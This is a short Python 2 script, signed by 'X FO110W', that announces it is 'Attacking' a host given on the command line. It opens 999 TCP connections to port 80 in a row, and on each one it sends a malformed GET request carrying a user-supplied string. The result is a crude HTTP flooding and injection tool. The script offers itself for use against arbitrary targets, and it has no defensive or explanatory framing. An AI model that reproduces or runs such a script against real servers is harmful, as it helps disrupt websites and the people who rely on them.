#ProgramImport
import os
import sys 
import socket

#WorkingCode
print "[Attacking " + sys.argv[1] + "...]"
print "Injecting " + sys.argv[2];
def attack():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1],80))
  print" >> GET / " + sys.argv[2] + "HTTP /1.1"
  s.send("GET /" + sys.argv[2] + "HTTP /1.1\r\n")
  s.send("HOST: " + sys.argv[1] + "\r\n\r\n");
  s.close()
for i in range(1,1000):
  attack()

#Code By X FO110W